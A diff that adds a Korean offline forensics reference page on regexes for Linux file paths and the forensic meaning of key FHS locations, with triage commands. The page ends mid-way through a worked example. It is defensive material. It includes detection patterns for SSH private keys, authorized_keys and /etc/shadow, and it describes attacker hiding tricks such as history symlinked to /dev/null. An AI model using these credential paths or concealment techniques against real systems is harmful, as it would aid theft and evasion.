@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Linux 경로 regex와 FHS 주요 경로별 포렌식 의미 · FOR-0138 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=%EB%A1%9C%EA%B7%B8%2FRegex">로그/Regex</a> / FOR-0138
+      </div>
+      <header class="article-head">
+        <h1>Linux 경로 regex와 FHS 주요 경로별 포렌식 의미</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">로그/Regex</span>
+      <span class="badge badge-type">레퍼런스</span>
+      <span class="badge badge-diff diff-basic">기본</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">linux</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>Linux 경로에서 금지된 문자는 /와 NUL 딱 두 개뿐이라 정규식으로 &quot;경로의 끝&quot;을 안전하게 판정할 수 없다 — 그래서 실전에서는 (?:/[^/\s]+)+로 공백 앞까지만 잡고, 경로 목록이 정확해야 할 때는 정규식이 아니라 find -print0 / awk 필드 / readlink -f로 확정한다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>grep, ripgrep, awk, Python, readlink, find</td></tr>
+<tr><th>artifact</th><td><code>auth.log</code> · <code>syslog</code> · <code>bash_history</code> · <code>crontab</code> · <code>audit.log</code> · <code>journal</code></td></tr>
+<tr><th>파일 경로</th><td><code>/var/log</code> · <code>/etc/passwd</code> · <code>/etc/shadow</code> · <code>/etc/crontab</code> · <code>/tmp</code> · <code>/var/tmp</code> · <code>/dev/shm</code> · <code>/root/.bash_history</code> · <code>/home/*/.ssh/authorized_keys</code> · <code>/var/spool/cron/crontabs</code> · <code>/etc/ld.so.preload</code> · <code>/etc/systemd/system</code></td></tr>
+<tr><th>regex</th><td><code>/(?:[^/\0]+/)*[^/\0]*</code> · <code>(?:/[^/\s]+)+</code> · <code>~(?:/[^/\s]+)*</code> · <code>^(?:/tmp|/var/tmp|/dev/shm|/run/shm)/</code> · <code>/\.[^/\s]+</code> · <code>/home/[^/]+/\.ssh/(?:authorized_keys|id_[a-z0-9]+|known_hosts)</code></td></tr>
+<tr><th>로그 필드</th><td><code>path</code> · <code>exe</code> · <code>cwd</code> · <code>COMMAND</code> · <code>PWD</code></td></tr>
+<tr><th>파일 형식</th><td><code>log</code> · <code>txt</code> · <code>json</code></td></tr>
+<tr><th>검색 별칭</th><td>리눅스 경로 정규식 · 경로 정규식 리눅스 · path regex linux · 슬래시 경로 뽑기 · fhs 경로 · 리눅스 어디 봐야 · tmp 악성코드</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p>Linux 경로에서 금지된 문자는 <code>/</code>와 NUL <strong>딱 두 개</strong>뿐이라 정규식으로 &quot;경로의 끝&quot;을 안전하게 판정할 수 없다 — 그래서 실전에서는 <code>(?:/[^/\s]+)+</code>로 공백 앞까지만 잡고, 경로 목록이 정확해야 할 때는 정규식이 아니라 <code>find -print0</code> / <code>awk</code> 필드 / <code>readlink -f</code>로 확정한다.</p>
+<h2 id="개념">개념</h2>
+<p>경로 규칙은 Windows보다 단순하지만, 그 단순함이 곧 함정이다.</p>
+<div class="table-wrap"><table><thead><tr><th>항목</th><th>규칙</th><th>정규식에 주는 영향</th></tr></thead><tbody><tr><td>구분자</td><td><code>/</code> 하나뿐</td><td>이스케이프 불필요. <code>\\</code> 지옥이 없다</td></tr><tr><td>금지 문자</td><td><code>/</code>와 <code>\0</code> <strong>뿐</strong></td><td>공백·개행·따옴표·이모지·제어문자가 파일명에 <strong>합법</strong></td></tr><tr><td>대소문자</td><td>구분한다</td><td><code>-i</code>를 함부로 쓰면 오탐이 늘어난다</td></tr><tr><td>연속 슬래시</td><td><code>//etc///passwd</code> = <code>/etc/passwd</code></td><td>정규식으로는 다른 문자열</td></tr><tr><td>후행 슬래시</td><td><code>/tmp/</code> = <code>/tmp</code> (디렉터리)</td><td>위와 동일</td></tr><tr><td><code>.</code> / <code>..</code></td><td>현재/상위 디렉터리</td><td><code>/var/log/../../tmp/x</code> 우회 표기</td></tr><tr><td>최대 길이</td><td>구성요소 255바이트, 전체 4096바이트(리눅스 관례)</td><td>잘린 경로 판정 기준</td></tr></tbody></table></div>
+<div class="table-wrap"><table><thead><tr><th>형태</th><th>예</th><th>정규식 조각</th></tr></thead><tbody><tr><td>절대경로</td><td><code>/var/log/auth.log</code></td><td><code>(?:/[^/\s]+)+</code></td></tr><tr><td>절대 디렉터리</td><td><code>/var/log/</code></td><td><code>(?:/[^/\s]+)+/?</code></td></tr><tr><td>상대경로</td><td><code>./run.sh</code>, <code>../etc/passwd</code>, <code>bin/x</code></td><td><code>\.{0,2}/[^/\s]+</code></td></tr><tr><td>홈 확장</td><td><code>~/.ssh/id_rsa</code>, <code>~hong/x</code></td><td><code>~[\w.-]*(?:/[^/\s]+)*</code></td></tr><tr><td>루트</td><td><code>/</code></td><td><code>^/$</code></td></tr></tbody></table></div>
+<h3 id="는-파일시스템이-아니라-셸이-처리한다"><code>~</code>는 파일시스템이 아니라 셸이 처리한다</h3>
+<p><code>~</code>는 <strong>셸(bash/zsh)이 확장하는 토큰</strong>이고 커널·<code>open()</code>에는 그런 개념이 없다. 그래서 <code>~/.ssh/id_rsa</code>라는 문자열은 <code>bash_history</code>·스크립트·명령행 로그에서만 보이고, <code>audit.log</code>의 <code>path=</code> 필드나 <code>/proc/&lt;pid&gt;/cmdline</code>에는 확장된 절대경로가 남는다. <strong>두 형태를 모두 검색해야 한다.</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">~(?:/[^/\s]+)*            # ~/.ssh/id_rsa
+~[A-Za-z_][\w.-]*(?:/[^/\s]+)*   # ~hong/.ssh/id_rsa
+\$HOME(?:/[^/\s]+)*       # $HOME/.ssh/id_rsa</code></pre></div>
+<h3 id="공백특수문자가-들어간-경로">공백·특수문자가 들어간 경로</h3>
+<p>파일명에 공백이 합법이므로 <code>/tmp/my file.txt</code>가 존재할 수 있다. 로그 한 줄이 <code>failed to open /tmp/my file.txt: EACCES</code>라면 정규식만으로는 경로가 <code>/tmp/my</code>에서 끝나는지 <code>/tmp/my file.txt</code>에서 끝나는지 <strong>알 수 없다.</strong> 판정 근거는 정규식 밖에 있다.</p>
+<div class="table-wrap"><table><thead><tr><th>근거</th><th>방법</th></tr></thead><tbody><tr><td>로그가 경로를 인용부호로 감싼다</td><td><code>&quot;([^&quot;]+)&quot;</code> 또는 <code>&#39;([^&#39;]+)&#39;</code> 기준으로 잡는다</td></tr><tr><td>로그가 구조화 필드다</td><td><code>auditd</code>의 <code>path=</code>, JSON의 <code>.path</code>, <code>journalctl -o json</code></td></tr><tr><td>확장자가 있다</td><td><code>(?:/[^/\s]+)*/[^/\s]*\.(?:sh|py|so|log)\b</code>로 끝을 고정</td></tr><tr><td>콜론으로 끝난다</td><td><code>((?:/[^/\s]+)+):</code> — <code>perror</code> 관례</td></tr><tr><td>실제 파일시스템이 있다</td><td>후보를 뽑아 <code>test -e</code>로 존재 확인</td></tr></tbody></table></div>
+<p>특수문자를 포함한 이름은 그 자체가 신호다. 개행·백스페이스·ANSI 이스케이프를 파일명에 넣어 <code>ls</code> 출력을 속이는 기법이 있다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 출력할 수 없는 문자가 들어간 파일명 찾기
+ls -lb /tmp                      # 비출력 문자를 \nnn 으로 표시
+find /tmp -name &#39;*[[:cntrl:]]*&#39;  # 제어문자 포함 이름
+find / -name &#39;.. *&#39; -o -name &#39;. *&#39; 2&gt;/dev/null   # 공백 붙은 점 디렉터리</code></pre></div>
+<h2 id="파일-경로">파일 / 경로</h2>
+<p>FHS 주요 경로와 <strong>각각을 왜 여는지</strong>다. 이 표가 리눅스 침해사고 대응의 체크리스트다.</p>
+<div class="table-wrap"><table><thead><tr><th>경로</th><th>FHS 용도</th><th>포렌식에서 보는 이유</th></tr></thead><tbody><tr><td><code>/var/log/</code></td><td>로그</td><td>모든 것의 출발점. 아래에 따로 정리</td></tr><tr><td><code>/etc/passwd</code></td><td>사용자 목록</td><td>UID 0 추가 계정, 셸이 <code>/bin/bash</code>인 서비스 계정</td></tr><tr><td><code>/etc/shadow</code></td><td>암호 해시</td><td>해시 형식(<code>$6$</code>=SHA-512), 마지막 변경일 필드</td></tr><tr><td><code>/etc/group</code>, <code>/etc/sudoers</code>, <code>/etc/sudoers.d/</code></td><td>권한</td><td><code>sudo</code>/<code>wheel</code> 그룹 추가, <code>NOPASSWD:ALL</code> 삽입</td></tr><tr><td><code>/etc/crontab</code>, <code>/etc/cron.d/</code>, <code>/etc/cron.*/</code></td><td>예약 작업</td><td>지속성 1순위</td></tr><tr><td><code>/var/spool/cron/crontabs/&lt;user&gt;</code> (Debian계)</td><td>사용자 crontab</td><td><code>crontab -e</code>의 실제 저장 위치</td></tr><tr><td><code>/var/spool/cron/&lt;user&gt;</code> (RHEL계)</td><td>사용자 crontab</td><td>배포판에 따라 경로가 다르다</td></tr><tr><td><code>/etc/systemd/system/</code>, <code>/lib/systemd/system/</code></td><td>서비스 유닛</td><td>악성 <code>.service</code> 지속성, <code>ExecStart=</code> 확인</td></tr><tr><td><code>/etc/rc.local</code>, <code>/etc/init.d/</code></td><td>부팅 스크립트</td><td>레거시 지속성</td></tr><tr><td><code>/etc/ld.so.preload</code></td><td>전역 프리로드</td><td><strong>정상적으로는 없거나 비어 있다.</strong> 존재하면 루트킷 강한 신호</td></tr><tr><td><code>/etc/ssh/sshd_config</code></td><td>SSH 설정</td><td><code>PermitRootLogin</code>, <code>AuthorizedKeysFile</code> 변조</td></tr><tr><td><code>/home/&lt;user&gt;/.ssh/authorized_keys</code></td><td>공개키</td><td><strong>공격자 키 추가 = 지속성.</strong> 키 주석에 호스트명이 남는다</td></tr><tr><td><code>/home/&lt;user&gt;/.ssh/id_rsa</code>, <code>id_ed25519</code></td><td>개인키</td><td>탈취 대상. 측면 이동</td></tr><tr><td><code>/home/&lt;user&gt;/.ssh/known_hosts</code></td><td>접속 이력</td><td>이 호스트에서 <strong>어디로</strong> 접속했는지</td></tr><tr><td><code>/root/.bash_history</code></td><td>root 명령 이력</td><td>시각이 없다(기본). <code>HISTTIMEFORMAT</code> 설정 시에만 있음</td></tr><tr><td><code>/home/&lt;user&gt;/.bash_history</code></td><td>사용자 명령 이력</td><td>크기 0이거나 <code>/dev/null</code> 심링크면 은닉</td></tr><tr><td><code>/home/&lt;user&gt;/.bashrc</code>, <code>.profile</code>, <code>.bash_profile</code></td><td>셸 초기화</td><td><code>alias</code>/함수로 명령 가로채기, <code>unset HISTFILE</code></td></tr><tr><td><code>/tmp/</code></td><td>임시 파일</td><td><strong>world-writable.</strong> 페이로드 드롭 1순위</td></tr><tr><td><code>/var/tmp/</code></td><td>재부팅 후에도 남는 임시 파일</td><td><code>/tmp</code>보다 오래 산다. 여기가 더 나쁘다</td></tr><tr><td><code>/dev/shm/</code></td><td>tmpfs 공유 메모리</td><td>world-writable + <strong>디스크에 안 남는다.</strong> 메모리 상주 페이로드</td></tr><tr><td><code>/run/</code>, <code>/var/run/</code></td><td>런타임 상태</td><td>PID 파일, 소켓. 재부팅 시 사라짐</td></tr><tr><td><code>/proc/&lt;pid&gt;/exe</code>, <code>cmdline</code>, <code>cwd</code>, <code>environ</code></td><td>프로세스 정보</td><td>실행 중 프로세스의 실제 바이너리(삭제됐어도 링크는 남는다)</td></tr><tr><td><code>/usr/local/bin/</code>, <code>/opt/</code></td><td>로컬 설치</td><td>패키지 관리자 밖의 바이너리. 정당성 확인 필요</td></tr><tr><td><code>/usr/bin/</code>, <code>/bin/</code>, <code>/sbin/</code></td><td>시스템 바이너리</td><td>무결성 검증 대상(<code>rpm -Va</code>, <code>debsums</code>)</td></tr><tr><td><code>/boot/</code></td><td>커널·initramfs</td><td>부트킷</td></tr><tr><td><code>/lib/modules/</code></td><td>커널 모듈</td><td>루트킷 <code>.ko</code></td></tr></tbody></table></div>
+<h3 id="varlog-하위"><code>/var/log</code> 하위</h3>
+<div class="table-wrap"><table><thead><tr><th>파일</th><th>내용</th><th>배포판</th></tr></thead><tbody><tr><td><code>/var/log/auth.log</code></td><td>인증(sshd, sudo, PAM)</td><td>Debian/Ubuntu</td></tr><tr><td><code>/var/log/secure</code></td><td>위와 동일</td><td>RHEL/CentOS/Rocky</td></tr><tr><td><code>/var/log/syslog</code></td><td>일반 시스템 로그</td><td>Debian/Ubuntu</td></tr><tr><td><code>/var/log/messages</code></td><td>위와 동일</td><td>RHEL계</td></tr><tr><td><code>/var/log/wtmp</code></td><td>로그인 성공 이력 (바이너리)</td><td><code>last</code></td></tr><tr><td><code>/var/log/btmp</code></td><td>로그인 실패 이력 (바이너리)</td><td><code>lastb</code></td></tr><tr><td><code>/var/run/utmp</code></td><td>현재 로그인 세션 (바이너리)</td><td><code>who</code></td></tr><tr><td><code>/var/log/lastlog</code></td><td>계정별 최종 로그인 (바이너리)</td><td><code>lastlog</code></td></tr><tr><td><code>/var/log/audit/audit.log</code></td><td>auditd</td><td><code>ausearch</code></td></tr><tr><td><code>/var/log/apache2/access.log</code>, <code>error.log</code></td><td>웹 (Debian)</td><td></td></tr><tr><td><code>/var/log/httpd/access_log</code>, <code>error_log</code></td><td>웹 (RHEL)</td><td></td></tr><tr><td><code>/var/log/nginx/access.log</code>, <code>error.log</code></td><td>웹</td><td></td></tr><tr><td><code>/var/log/cron</code>, <code>/var/log/syslog</code></td><td>cron 실행 기록</td><td>배포판에 따라 다름</td></tr><tr><td><code>/var/log/journal/</code></td><td>systemd 저널 (바이너리)</td><td><code>journalctl --file</code></td></tr></tbody></table></div>
+<p><code>*.1</code>, <code>*.gz</code>, <code>*-20260314</code> 같은 회전 파일을 반드시 함께 본다. <strong>현재 파일만 보면 사고 시점이 이미 회전되어 사라진 경우를 놓친다.</strong></p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">zgrep -h &#39;Failed password&#39; /var/log/auth.log*     # .gz 포함 전부</code></pre></div>
+<h2 id="주요-필드">주요 필드</h2>
+<h3 id="패턴-1-절대경로-후보-가장-많이-쓴다">패턴 1 — 절대경로 후보 (가장 많이 쓴다)</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">(?:/[^/\s]+)+</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>항목</th><th>값</th></tr></thead><tbody><tr><td>매칭됨</td><td><code>/var/log/auth.log</code>, <code>/tmp/x</code>, <code>/etc/passwd</code></td></tr><tr><td>매칭 안 됨</td><td><code>/</code> (루트 단독), <code>./run.sh</code>, <code>~/.ssh/id_rsa</code></td></tr><tr><td>오탐</td><td>URL 경로 <code>GET /admin/index.php</code>, 날짜 <code>14/Mar/2026</code>, 분수 <code>1/2</code></td></tr></tbody></table></div>
+<p><strong>URL 경로와 파일 경로가 구별되지 않는다는 점이 가장 큰 오탐 원인이다.</strong> 웹 로그를 섞어 돌리면 <code>/index.php</code>가 파일 경로로 잡힌다. 앞에 <code>http</code>나 따옴표+메서드가 오는 것을 배제한다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">(?&lt;!\w)(?&lt;!//)(?:/[^/\s]+)+</code></pre></div>
+<h3 id="패턴-2-확장자로-끝을-고정-정밀도-우선">패턴 2 — 확장자로 끝을 고정 (정밀도 우선)</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">(?:/[^/\s]+)*/[^/\s]*\.(?:sh|bash|py|pl|rb|php|so|ko|log|conf|key|pem|tar|gz|zip|elf|bin)\b</code></pre></div>
+<h3 id="패턴-3-world-writable-디렉터리-의심-1순위">패턴 3 — world-writable 디렉터리 (의심 1순위)</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">(?:^|[^\w/])(/tmp|/var/tmp|/dev/shm|/run/shm)/[^/\s]+</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>경로</th><th>정상 사용</th><th>공격에서의 의미</th></tr></thead><tbody><tr><td><code>/tmp</code></td><td>컴파일 임시 파일, 세션 파일, <code>systemd-private-*</code></td><td>페이로드 드롭·컴파일·실행</td></tr><tr><td><code>/var/tmp</code></td><td>패키지 빌드 잔여물</td><td>재부팅 후에도 남는다. 지속성과 결합</td></tr><tr><td><code>/dev/shm</code></td><td>PostgreSQL/Chrome 공유 메모리</td><td>디스크에 안 남는다. <strong>실행 파일이 있으면 거의 확정</strong></td></tr><tr><td><code>/run/shm</code></td><td><code>/dev/shm</code> 심링크(구 배포판)</td><td>위와 동일</td></tr></tbody></table></div>
+<p><code>/tmp</code>에 <strong>실행 권한이 붙은 파일</strong>이 있으면 그 자체로 조사 대상이다.</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">find /tmp /var/tmp /dev/shm -type f -perm -u+x -printf &#39;%T+ %s %M %p\n&#39; 2&gt;/dev/null | sort</code></pre></div>
+<h3 id="패턴-4-숨김-파일디렉터리">패턴 4 — 숨김 파일·디렉터리</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">/\.[^/\s]+</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>예</th><th>판단</th></tr></thead><tbody><tr><td><code>/home/hong/.bashrc</code>, <code>/root/.ssh</code></td><td>정상</td></tr><tr><td><code>/tmp/.X11-unix</code></td><td>정상(X 소켓)</td></tr><tr><td><code>/tmp/.ICE-unix</code>, <code>/tmp/.font-unix</code></td><td>정상</td></tr><tr><td><code>/tmp/.x</code>, <code>/var/tmp/.systemd</code>, <code>/dev/shm/.a</code></td><td><strong>의심.</strong> <code>/tmp</code> 숨김 파일 이름은 기준선과 비교한다</td></tr><tr><td><code>/usr/bin/...</code>, <code>/tmp/.. </code> (점 두 개 + 공백)</td><td>강한 의심. <code>ls</code>에서 안 보이게 하는 고전 기법</td></tr></tbody></table></div>
+<h3 id="패턴-5-ssh-키자격증명-경로">패턴 5 — SSH 키·자격증명 경로</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">/(?:home/[^/]+|root)/\.ssh/(?:authorized_keys|id_[a-z0-9]+|known_hosts|config)</code></pre></div>
+<p>이 경로가 <code>bash_history</code>나 <code>auth.log</code>에 나오면 지속성 또는 자격증명 탈취 시점이다.</p>
+<h3 id="심볼릭-링크">심볼릭 링크</h3>
+<p>정규식은 경로 문자열만 본다. <strong>그 경로가 실제로 무엇을 가리키는지는 정규식이 답할 수 없다.</strong></p>
+<div class="table-wrap"><table><thead><tr><th>확인할 것</th><th>명령</th><th>나오는 값</th></tr></thead><tbody><tr><td>최종 대상</td><td><code>readlink -f /path</code></td><td>링크를 모두 따라간 절대경로</td></tr><tr><td>링크 1단계</td><td><code>readlink /path</code></td><td>링크가 저장한 문자열 그대로</td></tr><tr><td>링크 여부</td><td><code>ls -l /path</code></td><td><code>lrwxrwxrwx ... -&gt; target</code></td></tr><tr><td>삭제된 바이너리</td><td><code>readlink /proc/&lt;pid&gt;/exe</code></td><td><code>/tmp/x (deleted)</code></td></tr><tr><td>이미지 안에서</td><td><code>fls</code>/Autopsy의 타입 열</td><td><code>l/l</code> = 심링크</td></tr></tbody></table></div>
+<p><code>~/.bash_history -&gt; /dev/null</code>은 은닉의 전형이다. <code>ls -l</code>로 확인한다.</p>
+<h2 id="빠른-명령">빠른 명령</h2>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash">grep -Eo &#39;(^|[^[:alnum:]_/])(/tmp|/var/tmp|/dev/shm)/[^[:space:]]+&#39; bash_history</code></pre></div>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 1) 로그에서 절대경로 후보 전부 + 빈도
+grep -Eo &#39;(/[^/[:space:]]+)+&#39; app.log | sort | uniq -c | sort -nr | head -20
+
+# 2) world-writable 경로만 (의심 1순위)
+grep -Eo &#39;(/tmp|/var/tmp|/dev/shm|/run/shm)/[^[:space:]]+&#39; /var/log/* 2&gt;/dev/null | sort -u
+
+# 3) 스크립트/바이너리 경로만
+grep -Eo &#39;(/[^/[:space:]]+)*/[^/[:space:]]*\.(sh|py|pl|so|ko|elf|bin)\b&#39; app.log | sort -u
+
+# 4) 인용부호로 감싸인 경로 (공백 포함 경로를 정확히)
+grep -Po &quot;(?&lt;=&#39;)[^&#39;]+(?=&#39;)&quot; app.log | grep -E &#39;^/&#39;
+
+# 5) auditd 는 정규식 대신 필드를 쓴다 -- 오탐 0
+ausearch -f /etc/passwd -i
+awk -F&#39;path=&#39; &#39;/path=/{split($2,a,&quot; &quot;);print a[1]}&#39; /var/log/audit/audit.log | sort | uniq -c | sort -nr
+
+# 6) 홈 확장 형태와 확장된 형태를 함께
+grep -Eo &#39;(~|\$HOME)(/[^/[:space:]]+)*&#39; bash_history | sort -u
+grep -Eo &#39;/(home/[^/]+|root)/\.ssh/[^/[:space:]]*&#39; bash_history /var/log/auth.log | sort -u
+
+# 7) 후보를 실제 파일시스템으로 검증한다 (정규식 오탐 제거)
+grep -Eoh &#39;(/[^/[:space:]]+)+&#39; app.log | sort -u |
+  while IFS= read -r p; do [ -e &quot;$p&quot; ] &amp;&amp; printf &#39;%s\n&#39; &quot;$p&quot;; done
+
+# 8) 경로 목록을 정확히 다루려면 -print0 / -z
+find /tmp -type f -print0 | xargs -0 ls -l      # 공백 파일명 안전
+grep -rlZ &#39;flag{&#39; /var/www | xargs -0 stat -c &#39;%y %n&#39;</code></pre></div>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import os, re
+from collections import Counter
+
+ABS      = re.compile(r&#39;(?&lt;!\w)(?:/[^/\s]+)+&#39;)
+SUSPECT  = re.compile(r&#39;(?:^|[^\w/])(/tmp|/var/tmp|/dev/shm|/run/shm)/[^/\s]+&#39;)
+HIDDEN   = re.compile(r&#39;/\.[^/\s]+&#39;)
+SSHKEY   = re.compile(r&#39;/(?:home/[^/]+|root)/\.ssh/(?:authorized_keys|id_[a-z0-9]+|known_hosts|config)&#39;)
+
+text = open(&#39;app.log&#39;, encoding=&#39;utf-8&#39;, errors=&#39;replace&#39;).read()
+
+for p, n in Counter(ABS.findall(text)).most_common(20):
+    print(f&#39;{n:6d}  {p}&#39;)
+
+# 정규식으로 뽑고 os.path 로 정규화한다 -- /var/log/../../tmp/x 우회를 잡는다
+for cand in set(ABS.findall(text)):
+    norm = os.path.normpath(cand)
+    if norm != cand:
+        print(f&#39;우회 표기: {cand}  -&gt;  {norm}&#39;)
+
+# 분해는 정규식이 아니라 posixpath 로
+import posixpath
+p = &#39;/home/hong/.ssh/authorized_keys&#39;
+print(posixpath.dirname(p), posixpath.basename(p), posixpath.splitext(p)[1])</code></pre></div>
+<h2 id="함께-보는-artifact">함께 보는 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>경로에서 얻은 것</th><th>다음 목표</th></tr></thead><tbody><tr><td><code>/tmp/x</code> 같은 드롭 파일</td><td><code>stat</code>로 mtime/ctime, <code>file</code>로 타입, 해시</td></tr><tr><td>실행된 스크립트 경로</td><td><code>auth.log</code>의 <code>sudo ... COMMAND=</code>, <code>audit.log</code>의 <code>execve</code></td></tr><tr><td><code>authorized_keys</code> 변경</td><td>그 시각의 <code>auth.log</code> <code>Accepted publickey</code></td></tr><tr><td>crontab 경로</td><td><code>/var/log/cron</code>(또는 <code>syslog</code>)에서 실제 실행 기록</td></tr><tr><td><code>/proc/&lt;pid&gt;/exe</code> 가 <code>(deleted)</code></td><td>메모리에서 바이너리 회수 (<code>/proc/&lt;pid&gt;/exe</code> 복사)</td></tr><tr><td>웹 업로드 경로</td><td><code>access.log</code>의 POST 요청 시각</td></tr><tr><td><code>bash_history</code> 명령</td><td>의심 명령 패턴 대조</td></tr><tr><td>파일 mtime</td><td>같은 시각대의 모든 로그 재검색</td></tr><tr><td>로그에 IP가 함께 있다</td><td>IPv4 추출 (<a href="./ipv4-regex.html">FOR-0128</a>)로 접속원 확정</td></tr><tr><td>디스크 이미지가 있다</td><td><code>fls</code>로 경로 목록 확보 (<a href="./tsk-fls.html">FOR-0041</a>) 후 <code>icat</code> 회수</td></tr><tr><td>어디서 시작할지 모르겠다</td><td>30초 트리아지 (<a href="./30sec-triage.html">FOR-0001</a>)</td></tr></tbody></table></div>
+<h2 id="흔한-실수">흔한 실수</h2>
+<ul><li><strong><code>\s</code>로 경로 끝을 판정하고 끝내는 것.</strong> 파일명에 공백이 합법이므로 <code>/tmp/my file.txt</code>가 <code>/tmp/my</code>로 잘린다. 인용부호·구조화 필드·확장자 앵커 중 하나로 끝을 고정하거나, 후보를 <code>test -e</code>로 검증한다.</li><li><strong>URL 경로를 파일 경로로 착각하는 것.</strong> <code>access.log</code>에 <code>(?:/[^/\s]+)+</code>를 돌리면 <code>/admin/index.php</code>가 전부 잡힌다. 대상 파일을 나눠서 돌린다.</li><li><strong>대소문자 무시로 검색하는 것.</strong> Linux는 대소문자를 구분한다. <code>/etc/Passwd</code>는 존재하지 않는 경로이므로 <code>-i</code>는 오탐만 늘린다. 반대로 <code>/tmp/A</code>와 <code>/tmp/a</code>는 <strong>다른 파일</strong>이다.</li><li><strong>연속 슬래시와 후행 슬래시를 다른 경로로 세는 것.</strong> <code>//tmp/x</code>, <code>/tmp//x</code>, <code>/tmp/x/</code>는 같은 대상이다. 집계 전에 <code>os.path.normpath</code>로 정규화한다.</li><li><strong><code>.</code>/<code>..</code> 우회 표기를 놓치는 것.</strong> <code>/var/www/uploads/../../../etc/passwd</code>는 <code>/etc/passwd</code>다. 웹 로그의 디렉터리 트래버설도 같은 원리이고 <code>%2e%2e%2f</code> URL 인코딩 변형까지 있다.</li><li><strong><code>~</code>로 검색을 끝내는 것.</strong> <code>bash_history</code>에는 <code>~/.ssh/id_rsa</code>가, <code>audit.log</code>에는 <code>/home/hong/.ssh/id_rsa</code>가 남는다. 두 형태를 모두 돌린다.</li><li><strong>회전 로그를 안 보는 것.</strong> <code>/var/log/auth.log</code>만 보면 <code>auth.log.1</code>, <code>auth.log.2.gz</code>에 있는 사고 당일 기록을 통째로 놓친다. <code>zgrep ... /var/log/auth.log*</code>.</li><li><strong>배포판 차이를 무시하는 것.</strong> <code>auth.log</code>(Debian) vs <code>secure</code>(RHEL), <code>crontabs/&lt;user&gt;</code>(Debian) vs <code>cron/&lt;user&gt;</code>(RHEL)로 경로가 다르다. 없으면 다른 이름으로 다시 찾는다.</li><li><strong>심볼릭 링크를 실제 파일로 보는 것.</strong> <code>/bin</code>이 <code>/usr/bin</code> 심링크인 배포판(usrmerge)에서는 같은 파일이 두 경로로 나온다. <code>readlink -f</code>로 정규화해야 중복이 사라진다.</li><li><strong><code>/dev/shm</code>을 안 보는 것.</strong> tmpfs이므로 이미지에는 없고 라이브 시스템이나 메모리 덤프에만 있다. 라이브 대응 시 가장 먼저 본다.</li><li><strong>파일명 특수문자를 셸에 그대로 넘기는 것.</strong> <code>-rf</code> 로 시작하는 파일명, 개행 포함 파일명이 명령을 깨뜨린다. <code>find -print0</code> / <code>xargs -0</code> / <code>--</code>를 쓴다.</li><li><strong>바이너리 로그를 <code>grep</code>으로 여는 것.</strong> <code>wtmp</code>/<code>btmp</code>/<code>lastlog</code>/<code>journal</code>은 텍스트가 아니다. <code>last -f</code>, <code>lastb -f</code>, <code>journalctl --file</code>로 읽는다.</li></ul>
+<h2 id="mini-example">mini example</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;침해된 Ubuntu 서버의 bash_history 와 auth.log 에서
+ 공격자가 남긴 페이로드 파일의 전체 경로와 지속성 수단을 구하세요.&quot;
+첨부: bash_history (412줄), auth.log (88,204줄)
+
+1. 첫 시도 (실패):
+   $ grep -E &#39;/tmp/*&#39; bash_history
+   (거의 모든 줄이 나옴)
+
+   이유: ERE 에서 `/tmp/*` 는 &quot;`/tmp` 뒤에 `/` 가 0개 이상&quot; 이다.
+        `*` 는 셸 와일드카드가 아니라 앞 문자의 반복이므로
+        `/tmp` 만 있어도 매칭되고, 게다가 부분 문자열 매칭이라
+        `/tmpfs`, `/var/tmp` 까지 걸린다.
+
+2. 접근 변경 -- 뒤에 실제 이름이 오는 것만
+   $ grep -Eo &#39;(/tmp|/var/tmp|/dev/shm)/[^[:space:]]+&#39; bash_history | sort -u
+   /dev/shm/.k
+   /tmp/.build
+   /tmp/nginx-1.24.0.tar.gz
